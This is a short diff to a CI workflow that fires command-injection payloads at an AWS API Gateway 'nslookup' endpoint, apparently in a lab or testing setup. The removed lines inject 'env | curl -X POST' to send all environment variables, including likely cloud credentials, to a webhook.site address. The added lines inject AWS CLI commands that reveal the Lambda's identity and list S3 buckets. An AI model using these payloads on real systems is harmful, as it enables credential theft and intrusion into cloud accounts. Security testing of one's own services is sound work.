@@ -25,16 +25,11 @@ jobs:
           REGION="us-east-1"
           URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
           
-          # new test
-          WEBHOOK="https://webhook.site/8326a6da-11aa-45dc-98de-58b8e5a55807"
+          # This payload runs nslookup, checks who the Lambda is running as, 
+          # and lists all S3 buckets using the Lambda's internal AWS CLI!
+          PAYLOAD='{"domain": "127.0.0.1; aws sts get-caller-identity; aws s3 ls"}'
           
-          # This payload runs nslookup, grabs all environment variables (env), 
-          # and POSTs them directly to your browser via your webhook!
-          PAYLOAD="{\"domain\": \"127.0.0.1; env | curl -X POST -d @- $WEBHOOK\"}"
-          
-          echo "=== FIRING EXFILTRATION PAYLOAD ==="
+          echo "=== TESTING INTERNAL VPC AWS CLI ==="
           curl -s -X POST "$URL" \
             -H "Content-Type: application/json" \
             -d "$PAYLOAD"
-          
-          echo "Check your webhook.site tab now!"
